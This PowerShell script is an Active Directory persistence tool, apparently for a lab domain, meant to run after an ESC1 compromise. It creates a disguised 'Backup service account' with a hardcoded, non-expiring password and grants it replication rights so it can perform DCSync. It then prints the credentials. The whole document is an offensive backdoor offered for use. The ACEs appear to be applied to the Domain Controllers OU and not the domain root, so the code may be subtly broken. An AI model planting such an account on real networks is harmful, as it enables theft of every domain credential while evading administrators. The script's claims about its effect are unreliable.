# Persistence: Create DCSync-capable account with no admin rights
# Run this on DC as Domain Administrator after ESC1 compromise

Import-Module ActiveDirectory

$username = "svc_backup"
$password = ConvertTo-SecureString "SecurePass123!" -AsPlainText -Force
$domain = "serini.lab"
$domainDN = "DC=serini,DC=lab"

# Check if user exists
$user = Get-ADUser -Filter "SamAccountName -eq '$username'" -ErrorAction SilentlyContinue

if (-not $user) {
    # Create low-privileged service account
    New-ADUser -Name $username `
        -SamAccountName $username `
        -UserPrincipalName "$username@$domain" `
        -AccountPassword $password `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -CannotChangePassword $true `
        -Description "Backup service account"
    
    Write-Host "[+] Created user: $username"
} else {
    Write-Host "[*] User already exists: $username"
}

# Grant DCSync rights (DS-Replication-Get-Changes and DS-Replication-Get-Changes-All)
$userDN = "CN=$username,CN=Users,$domainDN"
$rootDSE = Get-ADRootDSE
$dcDN = "OU=Domain Controllers,$($rootDSE.defaultNamingContext)"

# Get current ACL on Domain Controllers OU
$acl = Get-Acl "AD:$dcDN"

# DCSync GUIDs
$guid1 = [Guid]"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes
$guid2 = [Guid]"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"  # DS-Replication-Get-Changes-All

# Create ACEs for DCSync
$identity = New-Object System.Security.Principal.SecurityIdentifier((Get-ADUser $username).SID)
$ace1 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, "ExtendedRight", "Allow", $guid1)
$ace2 = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, "ExtendedRight", "Allow", $guid2)

$acl.AddAccessRule($ace1)
$acl.AddAccessRule($ace2)
Set-Acl -Path "AD:$dcDN" -AclObject $acl

Write-Host "[+] Granted DCSync rights to $username"
Write-Host "[*] Account has NO admin rights but can perform DCSync"
Write-Host "[*] Credentials: $username / SecurePass123!"
